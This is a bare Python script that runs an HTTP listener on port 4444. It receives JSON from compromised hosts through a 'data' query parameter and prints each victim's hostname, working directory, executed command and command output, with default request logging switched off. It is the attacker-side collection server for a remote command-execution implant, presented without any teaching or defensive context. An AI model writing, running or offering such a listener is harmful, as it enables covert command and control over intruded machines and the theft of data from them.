#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, json
from urllib.parse import unquote

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'data' in params:
            try:
                data = json.loads(unquote(params['data'][0]))
                print(f"\n[+] Connection from: {data.get('host', 'unknown')}")
                print(f"[+] Directory: {data.get('pwd', 'unknown')}")
                print(f"[+] Command: {data['cmd']}")
                print(f"[+] Output:\n{data['output']}")
                print("\n" + "="*50)
            except:
                print(f"\n[+] Raw data: {params['data'][0]}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

HTTPServer(('0.0.0.0', 4444), Handler).serve_forever()
